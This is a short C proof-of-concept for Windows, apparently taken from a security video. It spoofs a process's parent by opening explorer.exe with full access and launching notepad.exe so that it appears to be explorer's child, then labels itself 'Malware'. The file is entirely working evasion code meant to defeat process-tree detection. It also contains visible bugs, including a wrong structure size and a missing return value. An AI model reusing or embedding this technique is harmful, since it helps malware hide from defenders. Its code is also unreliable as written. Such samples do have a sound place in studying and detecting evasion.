#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>


// PoC from John Hammond's https://www.youtube.com/watch?v=PAlQp3ioIIA video

DWORD GetPidByName(const wchar_t* pName)
{
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) {
		while (Process32Next(snapshot, &pEntry) == TRUE) {
			if (wcscmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
}

int main(void)
{
	STARTUPINFOEX info = { sizeof(0) };
	PROCESS_INFORMATION processInfo;

	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hExplorerProcess = NULL;
	DWORD dwExplorerPid = 0;

	dwExplorerPid = GetPidByName(L"explorer.exe");
	if (dwExplorerPid == 0) {
		dwExplorerPid = GetCurrentProcessId();
	}

	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

	hExplorerProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwExplorerPid);
	UpdateProcThreadAttribute(
		pAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hExplorerProcess,
		sizeof(HANDLE),
		NULL,
		NULL);

	info.lpAttributeList = pAttributeList;

	CreateProcessA(
		NULL,
		(LPSTR)"notepad.exe",
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		(LPSTARTUPINFOA)&info.StartupInfo,
		&processInfo
	);

	printf("Malware PID: %d\nexplorer.exe PID: %d\nnotepad.exe PID: %d\n", GetCurrentProcessId(), dwExplorerPid, processInfo.dwProcessId);
	Sleep(30000);
	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(hExplorerProcess);

}
